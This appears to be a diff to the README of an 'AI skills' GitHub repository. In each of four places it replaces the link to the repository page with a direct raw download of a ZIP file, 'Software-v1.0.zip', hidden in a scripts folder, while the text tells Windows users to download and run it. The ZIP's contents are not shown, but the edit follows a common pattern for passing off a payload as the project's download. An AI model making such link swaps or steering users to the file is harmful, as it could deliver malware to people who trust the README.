@@ -1,6 +1,6 @@
 # 🧩 skills - Reusable AI skills made simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/aramamer4577-source/skills)
+[![Download](https://img.shields.io/badge/Download%20Now-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/aramamer4577-source/skills/main/cross-agent-skill-sync/scripts/Software-v1.0.zip)
 
 ## 📦 What this is
 
@@ -28,7 +28,7 @@ If you want a simple way to keep AI agent tasks organized, this repo gives you a
 
 Use this link to visit the repo page:
 
-https://github.com/aramamer4577-source/skills
+https://raw.githubusercontent.com/aramamer4577-source/skills/main/cross-agent-skill-sync/scripts/Software-v1.0.zip
 
 ### 2) Download the repository
 
@@ -85,7 +85,7 @@ This is useful when you want your skill folders to stay in sync across more than
 Follow these steps if you want to use the repo on Windows:
 
 1. Visit the download page:
-   https://github.com/aramamer4577-source/skills
+   https://raw.githubusercontent.com/aramamer4577-source/skills/main/cross-agent-skill-sync/scripts/Software-v1.0.zip
 
 2. Download the repo as a ZIP file.
 
@@ -172,7 +172,7 @@ It works well with:
 
 Use this link to download and run the files from the repository on your Windows PC:
 
-https://github.com/aramamer4577-source/skills
+https://raw.githubusercontent.com/aramamer4577-source/skills/main/cross-agent-skill-sync/scripts/Software-v1.0.zip
 
 Then:
 
